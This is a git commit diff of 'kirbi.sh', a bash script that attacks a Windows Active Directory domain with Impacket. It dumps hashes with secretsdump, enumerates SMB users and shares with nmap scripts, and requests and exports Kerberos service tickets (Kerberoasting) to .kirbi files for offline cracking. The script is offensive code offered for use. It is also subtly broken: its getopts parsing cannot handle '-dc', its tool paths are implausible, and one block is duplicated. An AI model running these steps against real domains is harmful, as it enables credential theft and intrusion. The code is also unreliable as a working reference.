210f0e8795fd468353891087f7128140d203fe1a
SezioS <118485549+sergiovks@users.noreply.github.com>
2023-03-03 19:00:13 +0100

    Update kirbi.sh

--- kirbi.sh
+++ kirbi.sh
@@ -1,17 +1,63 @@
 #!/bin/bash
 
+usage() {
+  echo "Usage: $0 -d <domain> -dc <domain_controller> -u <username> -p <password>" 1>&2;
+  echo
+  echo "This script performs several enumeration actions against a Windows Active Directory domain for the KERBEROS protocol using IMPACKET."
+  echo
+  echo "Options:"
+  echo "  -h, --help                                    Show this help message and exit."
+  echo "  -d, --domain DOMAIN                           The domain name to enumerate."
+  echo "  -dc, --domain-controller DOMAIN_CONTROLLER    The hostname or IP address of a domain controller."
+  echo "  -u, --user USER                               The username to use when authenticating to the domain (if not password is provided, user is '')."
+  echo "  -p, --password PASSWORD                       The password to use when authenticating to the domain (if you want to use, if not, user and pass are '')."
+  exit 1;
+}
+
+while getopts ":u:d:dc:p:h" opt; do
+  case ${opt} in
+    u|user)
+      USER=${OPTARG}
+      ;;
+    d|domain)
+      DOMAIN=${OPTARG}
+      ;;
+    dc|domain-controller)
+      DC=${OPTARG}
+      ;;
+    p|password)
+      PASSWORD=${OPTARG}
+      ;;
+    h|help)
+      usage
+      ;;
+    \?)
+      echo "Invalid option: -$OPTARG" >&2
+      usage
+      ;;
+    :)
+      echo "Option -$OPTARG requires an argument." >&2
+      usage
+      ;;
+  esac
+done
+
+if [ -z "${DOMAIN}" ] || [ -z "${DC}" ]; then
+    usage
+fi
+
+if [ -z "${USER}" ]; then
+    USER=""
+fi
+
+if [ -z "${PASSWORD}" ]; then
+    PASSWORD=""
+fi
+
 # Impacket installation is required, install using apt or pip
 # apt install python3-impacket
 # or
 # pip install impacket
-
-# Set the target domain and domain controller
-DOMAIN="example.com"
-DC="dc.example.com"
-
-# Set the username and password for the enumeration
-USER="user"
-PASSWORD="password"
 
 # Get the user's Kerberos hash
 HASH=$(/usr/local/bin/python3.8/dist-packages/secretsdump.py -no-pass $USER:$PASSWORD@$DC | grep "Hash" | cut -d " " -f 2)
@@ -34,6 +80,11 @@ nmap -p 445 --script=smb-os-discovery,smb-enum-users,smb-enum-shares,smb-enum-se
 # Enumerate domain users with password policy information
 /usr/local/bin/python3.8/dist-packages/GetADUsers.py $USER $PASSWORD $DOMAIN -all -k -o users_with_password_policy_info.txt
 
+# Enumerate Kerberos tickets
+/usr/local/bin/python3.8/dist-packages/GetUserSPNs.py $USER/$DOMAIN -request -dc-ip $DC -outputfile spn.txt -hashes $HASH
+
+# Dump Kerberos tickets
+/usr/local/bin/python3.8/dist-packages/ticket_converter.py -i spn.txt -o tickets.kirbi
 # Enumerate Kerberos tickets
 /usr/local/bin/python3.8/dist-packages/GetUserSPNs.py $USER/$DOMAIN -request -dc-ip $DC -outputfile spn.txt -hashes $HASH
 
